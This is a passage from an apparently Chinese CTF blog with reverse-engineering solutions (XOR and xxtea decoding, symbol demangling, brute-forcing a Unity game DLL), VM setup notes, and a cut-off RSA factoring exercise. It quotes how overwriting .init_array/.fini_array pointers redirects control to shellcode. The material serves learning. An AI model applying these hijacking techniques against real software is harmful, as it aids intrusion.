class="hljs-number">0xD</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xE</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x16</span>]<br><span class="hljs-comment">#C = [0xce,0xbc,0x40,0xa5,0xb2,0xf4,0xe7,0xb2,0x9d,0xa9,0x12,0x12,0xc8,0xae,0x5b,0x10,0x06,0x3d,0x1d,0xd7,0xf8,0xdc,0xdc,0x70]</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(A)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(A)):<br>        <span class="hljs-keyword">if</span> B[j] == A[i]:<br>            <span class="hljs-comment">#print hex(C[j])</span><br>            encrypt_data += <span class="hljs-built_in">chr</span>(C[j])<br>            <span class="hljs-keyword">break</span><br>key = <span class="hljs-string">&#x27;flag&#x27;</span><br>decrypt_data = xxtea.decrypt(encrypt_data, key)<br><span class="hljs-built_in">print</span> decrypt_data<br><span class="hljs-comment">#flag&#123;CXX_and_++tea&#125;</span><br></code></pre></td></tr></table></figure><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>没怎么逆<br>看的时候听学长说貌似要看sub_400D35函数<br>当时没多想点进去看了下就是个xor<br>和key<br><img src="36.png" alt="36"><br>看了下发现还是猜<br>第一个xor后为f<br>第四个为g<br>那不很明显flag吗<br>猜一下然后xor就行了</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span> = [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2F</span>,<br>  <span class="hljs-number">0x24</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x6E</span>,<br>  <span class="hljs-number">0x72</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x5B</span>]<br>b = <span class="hljs-string">&#x27;flag&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">a</span>)):<br>    flag += chr(<span class="hljs-keyword">a</span>[i]^(<span class="hljs-keyword">a</span>[i%<span class="hljs-number">4</span>]^ord(b[i%<span class="hljs-number">4</span>])))<br>print flag<br><span class="hljs-comment">#flag&#123;Act1ve_Defen5e_Test&#125;</span><br></code></pre></td></tr></table></figure><p>后来仔细看了下一开始对你输入进行了xor i比较<br>解一下</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">a = [ <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x6F</span>,<br>  <span class="hljs-number">0x63</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x33</span>,<br>  <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x3D</span>,<br>  <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x43</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">for i in range(len(a)):</span><br><span class="hljs-string">    flag += chr(a[i]^i)</span><br><span class="hljs-string">print flag</span><br><span class="hljs-string">#Info:The first four chars are `flag`</span><br></code></pre></td></tr></table></figure><p>然后又一次输入<br>对第二次输入进行一堆base64解密<br>直接比较<br>发现为<br><a href="https://bbs.pediy.com/thread-254172.htm">https://bbs.pediy.com/thread-254172.htm</a><br>然后就没了？？？？？？？？？？？？<br>在sub_400D35下断点发现断下来了<br>看来还是会跑过去<br>但是与输入无关。。。和时间相关</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">大多数可执行文件是通过链接 <span class="hljs-selector-tag">libc</span> 来进行编译的，因此 <span class="hljs-selector-tag">gcc</span> 会将 <span class="hljs-selector-tag">glibc</span> 初始化代码放入编译好的可执行文件和共享库中。 <span class="hljs-selector-class">.init_array</span>和 <span class="hljs-selector-class">.fini_array</span> 节（早期版本被称为 <span class="hljs-selector-class">.ctors</span>和 <span class="hljs-selector-class">.dtors</span> ）中存放了指向初始化代码和终止代码的函数指针。 <span class="hljs-selector-class">.init_array</span> 函数指针会在 <span class="hljs-selector-tag">main</span>() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 <span class="hljs-selector-class">.fini_array</span> 函数指针在 <span class="hljs-selector-tag">main</span>() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏（如曾经的 <span class="hljs-selector-tag">http</span>://<span class="hljs-selector-tag">phrack</span><span class="hljs-selector-class">.org</span>/<span class="hljs-selector-tag">issues</span>/57/9<span class="hljs-selector-class">.html</span> ）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 <span class="hljs-selector-tag">shellcode</span> 地址的函数指针来重写<span class="hljs-selector-class">.fini_array</span> 函数指针。对于大多数病毒或者恶意软件作者来说， <span class="hljs-selector-class">.init_array</span> 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。<br></code></pre></td></tr></table></figure><p>最后发现是这个考点。。。<br>打pwn的肯定知道</p><h2 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h2><p>三次输入<br>中间有sleep直接给patch了<br>先对输入进行了平方     FF0是pow函数<br>然后是乘4            A90是mul函数<br>然后对第二个输入<br>乘3<br>平方<br>对第三个输入<br>他先用7 * input3<br>然后result**input3<br>我佛了<br>下面是对输入的判断<br>input2&lt;input1&lt;input3          //应该是这个，没有仔细看<br>然后对三个输入之间进行一些蛇皮操作后就来最终check了<br>对了就有flag<br>//check大小完后的操作<br>550函数为add<br>7E0函数为del</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//我输入是 222 123 321</span><br>a = mul<span class="hljs-comment">(3,input1)</span><br>b = mul<span class="hljs-comment">(a,input1)</span><span class="hljs-comment">//147852</span><br>c = mul<span class="hljs-comment">(b,input2)</span><span class="hljs-comment">//18185796</span><br>pow<span class="hljs-comment">(input2,2)</span><span class="hljs-comment">//15129</span><br><br>a = mul<span class="hljs-comment">(3,input1)</span><span class="hljs-comment">//666</span><br>b<span class="hljs-number">1</span> = mul<span class="hljs-comment">(a,input2)</span>   <span class="hljs-comment">//input2已经平方 10075914</span><br>a = add<span class="hljs-comment">(a,b1)</span><span class="hljs-comment">//10076580</span><br>a = add<span class="hljs-comment">(input1,input2)</span><br>b<span class="hljs-number">2</span> = pow<span class="hljs-comment">(a,3)</span><span class="hljs-comment">//41063625</span><br>b<span class="hljs-number">3</span> = del<span class="hljs-comment">(b2,b1)</span><span class="hljs-comment">//30987711</span><br>temp<span class="hljs-number">0</span> = del<span class="hljs-comment">(b3,c)</span><span class="hljs-comment">//12801915</span><br><br><br>a = mul<span class="hljs-comment">(48,input3)</span><span class="hljs-comment">//15408</span><br>b = mul<span class="hljs-comment">(12,input3)</span><span class="hljs-comment">//3852</span><br>c = mul<span class="hljs-comment">(b,input3)</span><span class="hljs-comment">//1236492</span><br>d = add<span class="hljs-comment">(4,input3)</span><span class="hljs-comment">//325</span><br>x = pow<span class="hljs-comment">(d,3)</span><span class="hljs-comment">//34328125</span><br>temp<span class="hljs-number">1</span> = del<span class="hljs-comment">(x,c)</span><span class="hljs-comment">//33091633</span><br>temp<span class="hljs-number">2</span> = del<span class="hljs-comment">(temp1,a)</span><span class="hljs-comment">//33076225</span><br>temp<span class="hljs-number">3</span> = del<span class="hljs-comment">(temp2,22)</span><span class="hljs-comment">//33076203</span><br><span class="hljs-keyword">if</span>（temp<span class="hljs-number">3</span>==temp<span class="hljs-number">0</span>）<br>    cat flag<br></code></pre></td></tr></table></figure><p>最终化简是x*<em>3+y</em>3 = z**3+42<br><a href="https://www.sciencealert.com/the-sum-of-three-cubes-problem-has-been-solved-for-42">https://www.sciencealert.com/the-sum-of-three-cubes-problem-has-been-solved-for-42</a><br>google即可发现答案</p><h2 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h2><p>主要函数是<br>UnDecorateSymbolName(v5, outputString, 0x100u, 0);<br>反修饰<br>下面的验证直接爆破</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">#include &lt;stdint<span class="hljs-number">.</span>h&gt;<br>#include &lt;stdio<span class="hljs-number">.</span>h&gt;<br>#include &lt;string<span class="hljs-number">.</span>h&gt;<br>#include &lt;time<span class="hljs-number">.</span>h&gt;<br><br><br><span class="hljs-keyword">int</span> main()<br>&#123;<br>    unsigned char a[] = &#123;<span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>,<br>  <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x2A</span>,<br>  <span class="hljs-number">0x28</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x79</span>,<br>  <span class="hljs-number">0x75</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x52</span>,<br>  <span class="hljs-number">0x54</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x73</span>,<br>  <span class="hljs-number">0x64</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x41</span>,<br>  <span class="hljs-number">0x53</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x22</span>,<br>  <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3F</span>,<br>  <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2F</span>,<br>  <span class="hljs-number">0x00</span>&#125;<span class="hljs-comment">;</span><br>  unsigned char b[] = <span class="hljs-string">&quot;55565653255552225565565555243466334653663544426565555525555222&quot;</span><span class="hljs-comment">;</span><br>  unsigned char c[] = <span class="hljs-string">&quot;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&quot;</span><span class="hljs-comment">;</span><br>  <span class="hljs-keyword">int</span> i,temp<span class="hljs-comment">;</span><br>  for(i=<span class="hljs-number">0</span><span class="hljs-comment">;i&lt;64;i++)</span><br>  &#123;<br>    for(temp=<span class="hljs-number">32</span><span class="hljs-comment">;temp&lt;=125;temp++)</span><br>  &#123;<br>      if(a[temp<span class="hljs-subst">%23</span>]==c[i] &amp;&amp; a[temp/<span class="hljs-number">23</span>] == b[i])<br>      &#123;<br>          printf(<span class="hljs-string">&quot;%c&quot;</span>,temp)<span class="hljs-comment">;</span><br>          break<span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br>  &#125;<br>    return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)<br>发现反修饰后应该如上<br>下面就是修饰了。。。<br>只能百度一波来自学<br>发现为?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z<br>置换一下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span> = [<span class="hljs-number">11,12,13,14</span>,<span class="hljs-number">15,16,17,18</span>,<span class="hljs-number">19,20,21,22</span>,<span class="hljs-number">23,24,25,26</span>,<span class="hljs-number">27,28,29,30</span>,<span class="hljs-number">31,32,33,34</span>,<span class="hljs-number">35,36,37,38</span>,<span class="hljs-number">39</span>,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>]<br>B = [<span class="hljs-number">26,27,18,28</span>,<span class="hljs-number">29,19,14,30</span>,<span class="hljs-number">31,20,32,33</span>,<span class="hljs-number">21,15,12,34</span>,<span class="hljs-number">35,22,36,37</span>,<span class="hljs-number">23,16,38,39</span>,<span class="hljs-number">24,40,41,25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">13</span>,<span class="hljs-number">11</span>]<br>c = &#x27;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&#x27;<br>a = &#x27;&#x27;<br>for i in range(len(<span class="hljs-keyword">A</span>)):<br>    for j in range(len(<span class="hljs-keyword">A</span>)):<br>        if B[j] == <span class="hljs-keyword">A</span>[i]:<br>            a += c[j]<br>print a<br>#Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP<br></code></pre></td></tr></table></figure><p>输入为<br>Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP</p><h2 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h2><p>unity逆向<br>又是游戏，当我看到这个的时候已经猜到了。。。<br>打开csharp的dll一顿乱翻然后要爆破什么sha1爆破sha256<br>结果。。。翻了一波dll感觉很正常是在实现程序流程<br>最后随便翻翻发现Interface.dll里面有点神奇的东西<br>可惜是c++写的看起来烦死。。。<br>不知道怎么调试，后来acd说可以用win自带的什么rundll32<br>可是佛说 不行<br>后来问了骑驴才知道可以写程序直接加载dll库调试…<br>后来看了大佬的博客发现更好的代码<br>上一波大佬的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;libloaderapi.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* funcName = <span class="hljs-string">&quot;GameObject&quot;</span>;<br>HMODULE hDLL = LoadLibrary(<span class="hljs-string">L&quot;Interface.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDLL != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;load succ\n&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(*funcptr)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br>funcptr func = (funcptr)GetProcAddress(hDLL, funcName);<br><span class="hljs-keyword">if</span> (func != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> res = func(atoi(argv[<span class="hljs-number">1</span>]));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, res);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">for (int i = 0; i &lt; 100; i++) &#123;</span><br><span class="hljs-comment">signed int res = func(i);</span><br><span class="hljs-comment">printf(&quot;%d: %d\n&quot;, i, res);</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;have func\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no func\n&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;load fail\n&quot;</span>);<br>&#125;<br><br><br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行爆破即可</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;windows.h&gt;</span> // 必须包含 windows.h</span><br>typedef <span class="hljs-built_in">int</span> (*<span class="hljs-function"><span class="hljs-keyword">FUNC</span>)<span class="hljs-params">(unsigned int)</span>; // 指向函数的指针</span><br><span class="hljs-built_in">int</span> main()&#123;<br>HINSTANCE dllDemo = LoadLibrary(<span class="hljs-string">&quot;Interface.dll&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-function"><span class="hljs-keyword">FUNC</span> <span class="hljs-title">GameObject</span>;</span><br><span class="hljs-keyword">if</span>(dllDemo)&#123;<br>GameObject = (FUNADDR)GetProcAddress(dllDemo, <span class="hljs-string">&quot;GameObject&quot;</span>)<span class="hljs-comment">;</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>printf(<span class="hljs-string">&quot;Fail to load DLL!\n&quot;</span>)<span class="hljs-comment">;</span><br>system(<span class="hljs-string">&quot;pause&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br>&#125;<br>GameObject(<span class="hljs-number">0x65</span>)<span class="hljs-comment">;</span><br>system(<span class="hljs-string">&quot;pause&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面的是骑驴的<br>适合普遍dll<br>可以进去调试<br>//貌似在逆核的dll注入那有类似代码<br>//当时调过，但是没怎么在意。。。现在学到了</p><h1 id="虚拟机环境崩溃小记"><a href="#虚拟机环境崩溃小记" class="headerlink" title="虚拟机环境崩溃小记"></a>虚拟机环境崩溃小记</h1><p>以后我绝壁保存快照。。。<br>安装好虚拟机和vmware tools后<br>首先更新源<br>具体看下面链接<br><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a><br>然后开始美化<br>下载unity-tweak-tool，可能会提示找不到。。。这就需要添加源了<br>添加源<br>sudo add-apt-repository ppa:noobslab/themes<br>sudo add-apt-repository ppa:noobslab/apps<br>sudo add-apt-repository ppa:docky-core/ppa<br>sudo apt-get update<br>sudo apt-get install unity-tweak-tool<br>然后安装dash-to-dock<br><a href="https://extensions.gnome.org/">https://extensions.gnome.org/</a><br>完事。。。各种比例啊美化整一下<br>差不多就完事了。。。工具什么略</p><h1 id="密码学学习"><a href="#密码学学习" class="headerlink" title="密码学学习"></a>密码学学习</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>题目已知</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">n</span>=<span class="hljs-number">0</span>xe<span class="hljs-number">708251</span>f<span class="hljs-number">8</span>e<span class="hljs-number">8</span>b<span class="hljs-number">616121419</span>de<span class="hljs-number">1369</span>f<span class="hljs-number">44</span>b<span class="hljs-number">4</span>a<span class="hljs-number">92</span>f<span class="hljs-number">9641</span>b<span class="hljs-number">8270</span>ae<span class="hljs-number">6</span>c<span class="hljs-number">50</span>cef<span class="hljs-number">2</span>bb<span class="hljs-number">6548</span>de<span class="hljs-number">7633176399640</span>a<span class="hljs-number">553</span>cc<span class="hljs-number">764</span>ab<span class="hljs-number">02</span>decfd<span class="hljs-number">4</span>cbe<span class="hljs-number">45</span><br><br><span class="hljs-attribute">c</span>=<span class="hljs-number">0</span>x<span class="hljs-number">58</span>bd<span class="hljs-number">0290</span>b<span class="hljs-number">41</span>e<span class="hljs-number">567</span>e<span class="hljs-number">9839</span>a<span class="hljs-number">9</span>cc<span class="hljs-number">70295107</span>bb<span class="hljs-number">44</span>a<span class="hljs-number">9</span>e<span class="hljs-number">6</span>a<span class="hljs-number">9</span>b<span class="hljs-number">36</span>ee<span class="hljs-number">2</span>d<span class="hljs-number">36</span>e<span class="hljs-number">19</span>b<span class="hljs-number">01</span>bf<span class="hljs-number">55083823</span>b<span class="hljs-number">8983</span>e<span class="hljs-number">02</span>a<span class="hljs-number">8</span>ea<span class="hljs-number">5</span>b<span class="hljs-number">94</span>facb<span class="hljs-number">221797</span>babf<span class="hljs-number">72</span>b<br><br><span class="hljs-attribute">e</span>=<span class="hljs-number">0</span>x<span class="hljs-number">10001</span><br></code></pre></td></tr></table></figure><p>用yafu分解n得到下<br>P1 = 1235542029039790988583258906107<br>P2 = 1235542029039790988583258906103<br>P3 = 1235542029039790988583258906163<br>P4 = 1235542029039790988583258906019</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">import</span> gmpy2</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">n=<span class="hljs-number">0xe708251f8e8b616121419de1369f44b4a92f9641b8270ae6c50cef2bb6548de7633176399640a553cc764ab02decfd4cbe45</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">c=<span class="hljs-number">0x58bd0290b41e567e9839a9cc70295107bb44a9e6a9b36ee2d36e19b01bf55083823b8983e02a8ea5b94facb221797babf72b</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">e=<span class="hljs-number">0x10001</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">P1 = <span class="hljs-number">1235542029039790988583258906107</span></span><br><span 